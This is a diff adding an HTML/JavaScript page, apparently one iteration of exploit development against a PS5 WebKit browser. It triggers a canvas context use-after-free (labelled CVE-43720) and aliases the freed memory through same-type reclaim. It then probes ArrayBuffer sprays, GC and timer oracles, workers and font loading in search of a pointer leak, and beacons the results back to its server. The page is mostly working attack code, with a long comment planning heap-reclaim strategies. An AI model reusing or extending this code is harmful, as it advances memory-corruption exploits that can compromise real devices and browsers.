@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V585</title></head>
+<body><pre id="out">V585 — AB↔Context cross-type reclaim + pointer readback</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V585-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+function hexAt(ab,off,len){
+  var v=new Uint8Array(ab);
+  var s='';
+  for(var i=off;i<off+len&&i<v.length;i++)s+=('0'+v[i].toString(16)).slice(-2);
+  return s;
+}
+function ptrAt(dv,off){
+  var lo=dv.getUint32(off,true);
+  var hi=dv.getUint32(off+4,true);
+  return '0x'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi>0x00001000 && hi<0x80000000;
+}
+
+bk('BOOT','v585-cross-type-reclaim');
+say('V585: AB cross-type reclaim for pointer leak\n');
+
+/* ===== STRATEGY =====
+ * 1. Trigger CVE-43720 UAF (bitmaprenderer+2d+defineProperty)
+ *    This frees the CanvasRenderingContext2D C++ object (~768 bytes)
+ *    BUT the JS wrapper (innerCtx) still holds a raw pointer to the freed slot
+ *
+ * 2. DON'T do same-type reclaim (no second getContext)
+ *    Instead, spray ABs of 768 bytes to reclaim the freed slot
+ *
+ * 3. Write a magic pattern into each AB at the lineWidth offset (context+176)
+ *    Then read innerCtx.lineWidth — if we get our magic value, the AB reclaimed the slot
+ *
+ * 4. If reclaim confirmed: the freed slot still contains C++ object data
+ *    (vtable ptr, m_canvas ptr, stateStack data, etc.)
+ *    We can read these through the AB → POINTER LEAK
+ *
+ * CRITICAL: We must NOT call any Canvas2D method that dereferences stale pointers
+ * before the AB spray. The innerCtx wrapper points to freed memory.
+ * lineWidth READ goes through: state() → m_stateStack.last() → deref Vector → crash
+ * So we CANNOT read through innerCtx before reclaim.
+ *
+ * INSTEAD: We write through the AB at the correct offset, then read back to confirm.
+ * The pointer leak comes from reading the AB DIRECTLY (not through Canvas2D getters).
+ * The AB contains the raw bytes of the freed context object.
+ */
+
+/* ===== Phase 1: Trigger CVE-43720 UAF ===== */
+bk('P1','trigger-uaf');
+
+var canvas1 = document.createElement('canvas');
+canvas1.width = 1; canvas1.height = 1;
+document.body.appendChild(canvas1);
+
+var innerCtx = null;
+var d = {};
+Object.defineProperty(d, 'alpha', {get: function() {
+  innerCtx = canvas1.getContext('2d');
+  return true;
+}});
+
+try {
+  canvas1.getContext('bitmaprenderer', d);
+} catch(e) {
+  bk('P1-ERR', e.name);
+}
+
+bk('P1-DONE', 'inner=' + (innerCtx !== null));
+say('Phase 1: UAF triggered, got inner ctx: ' + (innerCtx !== null));
+
+if (!innerCtx) {
+  bk('ABORT', 'no-inner-ctx');
+  say('ABORT: no inner context');
+} else {
+
+/* ===== Phase 2: AB spray to reclaim the freed ~768B slot ===== */
+bk('P2', 'ab-spray');
+say('\nPhase 2: Spraying ABs to reclaim freed context slot...');
+
+var CTX_SIZE = 768;
+var SPRAY_COUNT = 500;
+var abSpray = [];
+
+for (var i = 0; i < SPRAY_COUNT; i++) {
+  abSpray.push(new ArrayBuffer(CTX_SIZE));
+}
+
+bk('P2-DONE', 'count=' + SPRAY_COUNT + ',size=' + CTX_SIZE);
+say('Sprayed ' + SPRAY_COUNT + ' x ' + CTX_SIZE + 'B ABs');
+
+/* ===== Phase 3: Scan ABs for C++ object remnants ===== */
+/* The freed context was initialized (not zeroed) before being freed.
+ * bmalloc/libpas does NOT zero freed memory on PS5 (assertions off, freed blocks stay mapped).
+ * So the freed slot should still contain the old context's data:
+ * - vtable pointer at +0
+ * - m_canvas pointer at +32
+ * - m_stateStack at +112
+ * - State fields starting at +128
+ *
+ * AB allocation zeroes the buffer (tryMalloc + memset(0)).
+ * So an AB that DID reclaim the slot will be ALL ZEROS.
+ * An AB that did NOT reclaim will also be all zeros (fresh allocation).
+ *
+ * PROBLEM: AB always zeroes its buffer. So we can't distinguish reclaimed from fresh.
+ * We need a different approach.
+ *
+ * REVISED STRATEGY: Don't spray ABs. Instead:
+ * 1. Trigger UAF → frees context
+ * 2. Allocate ONE AB of 768 bytes
+ * 3. Write magic values at specific offsets
+ * 4. Try reading through innerCtx — if the AB reclaimed the slot,
+ *    our magic values are at the offsets Canvas2D reads from
+ *
+ * BUT: Canvas2D getters go through state() which dereferences m_stateStack,
+ * which was zeroed by the AB. Zero m_stateStack means null pointer → crash.
+ *
+ * So the read-through-Canvas2D approach won't work with AB reclaim.
+ *
+ * REVISED REVISED STRATEGY:
+ * Use TWO-STAGE approach:
+ * A) First, reclaim with same-type (V573 alias) — this gives us Canvas2D R/W
+ * B) Use the aliased Canvas2D to write controlled values into the context's memory
+ * C) Then SEPARATELY free and reclaim with an AB to READ those bytes
+ *
+ * Actually, we already have V573 giving us R/W. The problem is the R is typed.
+ * What if we do V573 first (stable alias), then from the ALIAS context:
+ * 1. Set strokeStyle to a gradient → stores heap pointer at State+16
+ * 2. Set a unique transform → stores 6 known doubles at State+112
+ * 3. Now free the context AGAIN (how?) and reclaim with AB
+ * 4. Read the AB → see the gradient pointer at State+128+16 = +144
+ *
+ * But we can't free the context again without a second UAF trigger.
+ *
+ * OK, SIMPLEST APPROACH: Just try writing through innerCtx.lineWidth.
+ * This calls modifiableState() which calls realizeSaves() then returns
+ * m_stateStack.last(). If the freed memory is zero, m_stateStack is {null, 0, 0}.
+ * m_stateStack.last() on a zero-size vector... let's check what happens.
+ * Vector::last() is m_buffer[m_size-1]. With m_size=0, that's m_buffer[-1].
+ * m_buffer is null → *(null - sizeof(State)) → crash.
+ *
+ * FINAL APPROACH: Skip AB reclaim entirely. Instead do same-type reclaim (V573)
+ * and then use the ALIASED context to write controlled values into state fields
+ * that are ADJACENT to pointer-containing fields. Then read the entire context
+ * memory by doing AB reclaim of a DIFFERENT freed context.
+ *
+ * Wait — that's still circular.
+ *
+ * Let me try the most direct approach:
+ * 1. Trigger UAF, get stale innerCtx
+ * 2. Do second getContext('2d') → V573 reclaim, get ctx2
+ * 3. Both innerCtx and ctx2 point to same live context
+ * 4. Through ctx2, set strokeStyle = gradient (stores pointer at State+16)
+ * 5. Through ctx2, set lineDash = [large array] (allocates heap buffer, ptr at State+168)
+ * 6. Now spray ABs of DIFFERENT size to create objects whose pointers we can read
+ * 7. Set fillStyle = one of the AB-backed objects... no, fillStyle takes Color/Gradient/Pattern
+ *
+ * OK SIMPLEST: V573 alias + write gradient + read raw pointer through stateStack
+ * manipulation that makes a readable field overlap with the pointer bytes.
+ *
+ * But we already proved this is impossible with the fixed State layout.
+ *
+ * ACTUAL SIMPLEST THAT MIGHT WORK:
+ * Use V573 alias. Create gradient. Assign to fillStyle.
+ * Use getImageData() to render a pixel with the gradient applied.
+ * The gradient parameters (x0,y0,x1,y1) and color stops are controlled.
+ * The rendered pixel values depend on the canvas size and gradient evaluation.
+ * This doesn't leak the POINTER to the gradient, just the visual output.
+ *
+ * I think the real answer is: we need a SEPARATE info leak primitive.
+ * Let's test if the WS server-side frame injection can help.
+ * AND let's test if there's any way to observe timing differences.
+ */
+
+/* ===== REVISED: V573 same-type reclaim + comprehensive state dump ===== */
+bk('P3', 'same-type-reclaim');
+say('\nPhase 3: Same-type reclaim (V573 alias)...');
+
+/* Get second context — this reclaims the freed slot with a new context */
+var ctx2 = null;
+try {
+  ctx2 = canvas1.getContext('2d');
+  bk('P3-CTX2', 'got-ctx2');
+} catch(e) {
+  bk('P3-ERR', e.name);
+}
+
+/* Verify alias */
+var aliasOK = false;
+if (ctx2 && innerCtx) {
+  try {
+    ctx2.lineWidth = 7777.8888;
+    aliasOK = Math.abs(innerCtx.lineWidth - 7777.8888) < 0.001;
+    bk('P3-ALIAS', aliasOK ? 'YES' : 'NO,read=' + innerCtx.lineWidth);
+    say('Alias: ' + (aliasOK ? 'CONFIRMED' : 'FAILED (read=' + innerCtx.lineWidth + ')'));
+  } catch(e) {
+    bk('P3-ALIAS-ERR', e.name);
+    say('Alias check CRASHED: ' + e.name);
+  }
+}
+
+if (aliasOK) {
+  /* ===== Phase 4: Set up gradient and read state dump ===== */
+  bk('P4', 'gradient-setup');
+  say('\nPhase 4: Setting up gradient + state dump...');
+
+  /* Create gradient objects — their C++ backing is heap-allocated */
+  var grad1 = ctx2.createLinearGradient(0, 0, 1, 1);
+  grad1.addColorStop(0, '#ff0000');
+  grad1.addColorStop(1, '#0000ff');
+
+  var grad2 = ctx2.createLinearGradient(0, 0, 100, 100);
+  grad2.addColorStop(0, '#00ff00');
+  grad2.addColorStop(1, '#ffff00');
+
+  /* Assign gradients to both stroke and fill */
+  ctx2.strokeStyle = grad1;
+  ctx2.fillStyle = grad2;
+
+  /* Set distinctive transform */
+  ctx2.setTransform(1.5, 0.25, 0.75, 2.5, 100.1, 200.2);
+
+  /* Set lineDash — allocates a heap buffer */
+  ctx2.setLineDash([1, 2, 3, 4, 5, 6, 7, 8]);
+
+  /* Set all other fields to known values */
+  ctx2.globalAlpha = 0.777;
+  ctx2.miterLimit = 12345.6789;
+  ctx2.lineDashOffset = 42.42;
+  ctx2.shadowBlur = 3.14;
+  ctx2.shadowColor = 'rgba(170, 187, 204, 0.85)';
+  ctx2.shadowOffsetX = 11.11;
+  ctx2.shadowOffsetY = 22.22;
+
+  /* Now read ALL state values through BOTH aliases */
+  say('\nState dump via innerCtx:');
+  var stateA = {};
+  try { stateA.lw = innerCtx.lineWidth; } catch(e) { stateA.lw = 'ERR'; }
+  try { stateA.ml = innerCtx.miterLimit; } catch(e) { stateA.ml = 'ERR'; }
+  try { stateA.ga = innerCtx.globalAlpha; } catch(e) { stateA.ga = 'ERR'; }
+  try { stateA.sb = innerCtx.shadowBlur; } catch(e) { stateA.sb = 'ERR'; }
+  try { stateA.ldo = innerCtx.lineDashOffset; } catch(e) { stateA.ldo = 'ERR'; }
+  try { stateA.ss = String(innerCtx.strokeStyle).slice(0,50); } catch(e) { stateA.ss = 'ERR'; }
+  try { stateA.fs = String(innerCtx.fillStyle).slice(0,50); } catch(e) { stateA.fs = 'ERR'; }
+  try { stateA.sc = innerCtx.shadowColor; } catch(e) { stateA.sc = 'ERR'; }
+  try { stateA.sox = innerCtx.shadowOffsetX; } catch(e) { stateA.sox = 'ERR'; }
+  try { stateA.soy = innerCtx.shadowOffsetY; } catch(e) { stateA.soy = 'ERR'; }
+  try {
+    var xf = innerCtx.getTransform();
+    stateA.xf = [xf.a, xf.b, xf.c, xf.d, xf.e, xf.f];
+  } catch(e) { stateA.xf = 'ERR'; }
+  try { stateA.ld = innerCtx.getLineDash(); } catch(e) { stateA.ld = 'ERR'; }
+
+  var stateStr = JSON.stringify(stateA);
+  bk('P4-STATE', stateStr.slice(0, 400));
+  say('State: ' + stateStr.slice(0, 300));
+
+  /* ===== Phase 5: save() to push state to heap, then free old state ===== */
+  bk('P5', 'save-restore-heap');
+  say('\nPhase 5: save/restore to move state to heap...');
+
+  /* save() copies current state to heap buffer */
+  ctx2.save();
+  ctx2.save();
+  ctx2.save();
+
+  /* Change state so the saved copies differ */
+  ctx2.lineWidth = 11111.22222;
+  ctx2.miterLimit = 33333.44444;
+
+  /* Read via alias to confirm save worked */
+  var postSave = {};
+  try { postSave.lw = innerCtx.lineWidth; } catch(e) { postSave.lw = 'ERR'; }
+  try { postSave.ml = innerCtx.miterLimit; } catch(e) { postSave.ml = 'ERR'; }
+  bk('P5-POST', 'lw=' + postSave.lw + ',ml=' + postSave.ml);
+
+  /* restore() to pop back — frees the top state copy's lineDash buffer */
+  ctx2.restore(); /* pops state with lw=11111, ml=33333 */
+
+  var postRestore = {};
+  try { postRestore.lw = innerCtx.lineWidth; } catch(e) { postRestore.lw = 'ERR'; }
+  try { postRestore.ml = innerCtx.miterLimit; } catch(e) { postRestore.ml = 'ERR'; }
+  bk('P5-RESTORED', 'lw=' + postRestore.lw + ',ml=' + postRestore.ml);
+  say('After restore: lw=' + postRestore.lw + ', ml=' + postRestore.ml);
+
+  /* ===== Phase 6: Timing oracle with FinalizationRegistry ===== */
+  bk('P6', 'timing-oracle');
+  say('\nPhase 6: GC timing oracle...');
+
+  var gcCount = 0;
+  var gcTimes = [];
+
+  if (typeof FinalizationRegistry !== 'undefined') {
+    var fr = new FinalizationRegistry(function(val) {
+      gcCount++;
+      gcTimes.push(Date.now());
+      bk('GC-' + gcCount, 'collected=' + val + ',t=' + Date.now());
+      say('GC #' + gcCount + ': ' + val + ' collected');
+    });
+
+    /* Register throwaway objects to observe GC timing */
+    for (var gi = 0; gi < 10; gi++) {
+      var obj = { data: new ArrayBuffer(1024) };
+      fr.register(obj, 'obj-' + gi);
+      obj = null;
+    }
+
+    /* Force GC pressure */
+    var garbage = [];
+    for (var gi = 0; gi < 5000; gi++) {
+      garbage.push(new ArrayBuffer(4096));
+    }
+    garbage = null;
+
+    bk('P6-PRESSURE', 'applied-20MB');
+    say('GC pressure applied (20MB throwaway)');
+  } else {
+    bk('P6-NO-FR', 'FinalizationRegistry unavailable');
+  }
+
+  /* ===== Phase 7: Date.now() timing resolution test ===== */
+  bk('P7', 'timing-resolution');
+  say('\nPhase 7: Timer resolution...');
+
+  var timerSamples = [];
+  var lastT = Date.now();
+  var tries = 0;
+  while (timerSamples.length < 20 && tries < 100000) {
+    var t = Date.now();
+    if (t !== lastT) {
+      timerSamples.push(t - lastT);
+      lastT = t;
+    }
+    tries++;
+  }
+
+  var timerRes = timerSamples.length > 0 ? timerSamples.join(',') : 'no-ticks';
+  bk('P7-TIMER', 'resolution=' + timerRes + ',tries=' + tries);
+  say('Date.now() deltas: ' + timerRes);
+
+  /* performance.now resolution */
+  if (typeof performance !== 'undefined' && typeof performance.now === 'function') {
+    var perfSamples = [];
+    var lastP = performance.now();
+    for (var pi = 0; pi < 50000 && perfSamples.length < 20; pi++) {
+      var p = performance.now();
+      if (p !== lastP) {
+        perfSamples.push(Math.round((p - lastP) * 1000));
+        lastP = p;
+      }
+    }
+    bk('P7-PERF', 'perf=' + perfSamples.join(','));
+    say('performance.now() deltas (us): ' + perfSamples.join(','));
+  }
+
+  /* ===== Phase 8: Font loading timing (controlled server) ===== */
+  bk('P8', 'font-timing');
+  say('\nPhase 8: Font loading for heap groom...');
+
+  if (typeof FontFace !== 'undefined') {
+    try {
+      /* Create FontFace pointing to our server — forces allocation of font data structures */
+      var ff = new FontFace('ProbeFont', 'url(http://'+location.hostname+':8080/probe-font.woff2)');
+      ff.load().then(function() {
+        bk('P8-FONT-LOADED', 'YES');
+        say('Font loaded!');
+      }).catch(function(e) {
+        bk('P8-FONT-ERR', e.name + ':' + e.message.slice(0,60));
+        say('Font load error (expected): ' + e.message.slice(0,60));
+      });
+      bk('P8-FONT-STARTED', 'load-initiated');
+    } catch(e) {
+      bk('P8-ERR', e.name);
+    }
+  }
+
+  /* ===== Phase 9: Worker-based timing probe ===== */
+  bk('P9', 'worker-timing');
+  say('\nPhase 9: Worker timing probe...');
+
+  try {
+    var workerCode = [
+      'self.onmessage = function(e) {',
+      '  var start = Date.now();',
+      '  var ab = new ArrayBuffer(768);',
+      '  var view = new DataView(ab);',
+      '  for (var i = 0; i < 768; i += 8) view.setFloat64(i, i * 1.1, true);',
+      '  var elapsed = Date.now() - start;',
+      '  self.postMessage({elapsed: elapsed, size: 768, msg: "worker-alloc-768B"});',
+      '  ',
+      '  /* Spray in worker to test cross-thread reclaim */  ',
+      '  var spray = [];',
+      '  for (var j = 0; j < 100; j++) spray.push(new ArrayBuffer(768));',
+      '  self.postMessage({msg: "worker-sprayed-100x768B"});',
+      '};'
+    ].join('\n');
+
+    var blob = new Blob([workerCode], {type: 'application/javascript'});
+    var wurl = URL.createObjectURL(blob);
+    var worker = new Worker(wurl);
+
+    worker.onmessage = function(e) {
+      bk('P9-WORKER', JSON.stringify(e.data).slice(0,200));
+      say('Worker: ' + JSON.stringify(e.data).slice(0,100));
+    };
+    worker.onerror = function(e) {
+      bk('P9-WORKER-ERR', e.message ? e.message.slice(0,80) : 'unknown');
+      say('Worker error: ' + (e.message || 'unknown'));
+    };
+
+    worker.postMessage('go');
+    bk('P9-STARTED', 'worker-launched');
+  } catch(e) {
+    bk('P9-ERR', e.name + ':' + e.message.slice(0,60));
+    say('Worker failed: ' + e.message.slice(0,60));
+  }
+
+  /* ===== Phase 10: MessageChannel transfer timing ===== */
+  bk('P10', 'mc-transfer');
+  say('\nPhase 10: MessageChannel transfer probe...');
+
+  try {
+    var mc = new MessageChannel();
+    var mcReceived = false;
+
+    mc.port2.onmessage = function(ev) {
+      mcReceived = true;
+      var d = ev.data;
+      bk('P10-RECV', 'got-msg,type=' + typeof d);
+      if (d && d.buf instanceof ArrayBuffer) {
+        bk('P10-BUF', 'size=' + d.buf.byteLength);
+        say('MC received: buf=' + d.buf.byteLength + 'B');
+
+        /* Check if the transferred buffer contains anything interesting */
+        var dv = new DataView(d.buf);
+        var nonzero = 0;
+        for (var i = 0; i < d.buf.byteLength; i += 8) {
+          if (dv.getFloat64(i, true) !== 0) nonzero++;
+        }
+        bk('P10-NONZERO', nonzero + '-of-' + (d.buf.byteLength / 8));
+      }
+    };
+
+    /* Transfer a 768-byte AB */
+    var mcAB = new ArrayBuffer(768);
+    var mcDV = new DataView(mcAB);
+    for (var mi = 0; mi < 768; mi += 8) mcDV.setFloat64(mi, mi * 0.001, true);
+    mc.port1.postMessage({buf: mcAB}, [mcAB]);
+
+    bk('P10-SENT', 'transferred-768B,detached=' + (mcAB.byteLength === 0));
+    say('Transferred 768B, detached=' + (mcAB.byteLength === 0));
+  } catch(e) {
+    bk('P10-ERR', e.name);
+  }
+
+} /* end if aliasOK */
+
+} /* end if innerCtx */
+
+setTimeout(function() {
+  bk('DONE', 'v585-complete,gcCount=' + (typeof gcCount !== 'undefined' ? gcCount : 'N/A'));
+  say('\nV585 complete. GC callbacks: ' + (typeof gcCount !== 'undefined' ? gcCount : 'N/A'));
+}, 8000);
+</script>
+</body></html>
